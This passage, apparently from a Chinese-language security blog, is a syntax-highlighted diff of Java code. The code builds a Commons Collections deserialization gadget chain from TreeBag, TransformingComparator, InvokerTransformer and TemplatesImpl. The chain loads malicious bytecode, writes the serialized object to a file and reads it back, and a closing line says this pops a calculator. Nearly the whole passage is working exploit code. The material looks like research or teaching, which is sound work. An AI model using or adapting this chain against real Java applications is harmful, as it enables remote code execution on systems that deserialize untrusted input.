-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> String fileName <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;CC4WithTreeBag.bin&#34;</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CC4WithTreeBag</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> String fileName <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;CC4WithTreeBag.bin&#34;</span>;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span><span style="color:#f92672">(</span>String<span style="color:#f92672">[]</span> args<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 读取恶意类 bytes[]
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        InputStream inputStream <span style="color:#f92672">=</span> CC4WithTreeBag<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getResourceAsStream</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Calc.class&#34;</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span>      bytes       <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[</span>inputStream<span style="color:#f92672">.</span><span style="color:#a6e22e">available</span><span style="color:#f92672">()];</span>
-</span></span><span style="display:flex;"><span>        inputStream<span style="color:#f92672">.</span><span style="color:#a6e22e">read</span><span style="color:#f92672">(</span>bytes<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 读取恶意类 bytes[]</span>
+</span></span><span style="display:flex;"><span>        InputStream inputStream <span style="color:#f92672">=</span> CC4WithTreeBag.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">getResourceAsStream</span>(<span style="color:#e6db74">&#34;Calc.class&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span>      bytes       <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[</span>inputStream.<span style="color:#a6e22e">available</span>()<span style="color:#f92672">]</span>;
+</span></span><span style="display:flex;"><span>        inputStream.<span style="color:#a6e22e">read</span>(bytes);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 初始化 TemplatesImpl 对象
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        TemplatesImpl tmpl      <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TemplatesImpl<span style="color:#f92672">();</span>
-</span></span><span style="display:flex;"><span>        Field bytecodes <span style="color:#f92672">=</span> TemplatesImpl<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getDeclaredField</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;_bytecodes&#34;</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>        bytecodes<span style="color:#f92672">.</span><span style="color:#a6e22e">setAccessible</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>        bytecodes<span style="color:#f92672">.</span><span style="color:#a6e22e">set</span><span style="color:#f92672">(</span>tmpl<span style="color:#f92672">,</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[][]{</span>bytes<span style="color:#f92672">});</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// _name 不能为空
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        Field name <span style="color:#f92672">=</span> TemplatesImpl<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getDeclaredField</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;_name&#34;</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>        name<span style="color:#f92672">.</span><span style="color:#a6e22e">setAccessible</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>        name<span style="color:#f92672">.</span><span style="color:#a6e22e">set</span><span style="color:#f92672">(</span>tmpl<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;reus09&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 初始化 TemplatesImpl 对象</span>
+</span></span><span style="display:flex;"><span>        TemplatesImpl tmpl      <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TemplatesImpl();
+</span></span><span style="display:flex;"><span>        Field bytecodes <span style="color:#f92672">=</span> TemplatesImpl.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;_bytecodes&#34;</span>);
+</span></span><span style="display:flex;"><span>        bytecodes.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>        bytecodes.<span style="color:#a6e22e">set</span>(tmpl, <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[][]</span>{bytes});
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// _name 不能为空</span>
+</span></span><span style="display:flex;"><span>        Field name <span style="color:#f92672">=</span> TemplatesImpl.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;_name&#34;</span>);
+</span></span><span style="display:flex;"><span>        name.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>        name.<span style="color:#a6e22e">set</span>(tmpl, <span style="color:#e6db74">&#34;reus09&#34;</span>);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>         <span style="color:#75715e">// 用 InvokerTransformer 来反射调用 TemplatesImpl 的 newTransformer 方法
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>         <span style="color:#75715e">// 这个类是 public 的，方便调用
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        Transformer transformer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> InvokerTransformer<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;toString&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]{},</span> <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]{});</span>
+</span></span><span style="display:flex;"><span>         <span style="color:#75715e">// 用 InvokerTransformer 来反射调用 TemplatesImpl 的 newTransformer 方法</span>
+</span></span><span style="display:flex;"><span>         <span style="color:#75715e">// 这个类是 public 的，方便调用</span>
+</span></span><span style="display:flex;"><span>        Transformer transformer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;toString&#34;</span>, <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{}, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{});
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        TransformingComparator comparator  <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TransformingComparator<span style="color:#f92672">(</span>transformer<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        TransformingComparator comparator  <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TransformingComparator(transformer);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// prepare CommonsCollections object entry point
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        TreeBag tree <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TreeBag<span style="color:#f92672">(</span>comparator<span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>        tree<span style="color:#f92672">.</span><span style="color:#a6e22e">add</span><span style="color:#f92672">(</span>tmpl<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// prepare CommonsCollections object entry point</span>
+</span></span><span style="display:flex;"><span>        TreeBag tree <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TreeBag(comparator);
+</span></span><span style="display:flex;"><span>        tree.<span style="color:#a6e22e">add</span>(tmpl);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 反射 将`InvokeTransformer` 中的方法 修改为 `newTransformer`
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        Field field <span style="color:#f92672">=</span> InvokerTransformer<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getDeclaredField</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;iMethodName&#34;</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>        field<span style="color:#f92672">.</span><span style="color:#a6e22e">setAccessible</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>        field<span style="color:#f92672">.</span><span style="color:#a6e22e">set</span><span style="color:#f92672">(</span>transformer<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;newTransformer&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 反射 将`InvokeTransformer` 中的方法 修改为 `newTransformer`</span>
+</span></span><span style="display:flex;"><span>        Field field <span style="color:#f92672">=</span> InvokerTransformer.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;iMethodName&#34;</span>);
+</span></span><span style="display:flex;"><span>        field.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>        field.<span style="color:#a6e22e">set</span>(transformer, <span style="color:#e6db74">&#34;newTransformer&#34;</span>);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        SeralizeUtil<span style="color:#f92672">.</span><span style="color:#a6e22e">writeObjectToFile</span><span style="color:#f92672">(</span>tree<span style="color:#f92672">,</span> fileName<span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>        SeralizeUtil<span style="color:#f92672">.</span><span style="color:#a6e22e">readFileObject</span><span style="color:#f92672">(</span>fileName<span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>        SeralizeUtil.<span style="color:#a6e22e">writeObjectToFile</span>(tree, fileName);
+</span></span><span style="display:flex;"><span>        SeralizeUtil.<span style="color:#a6e22e">readFileObject</span>(fileName);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>实现弹窗</p>
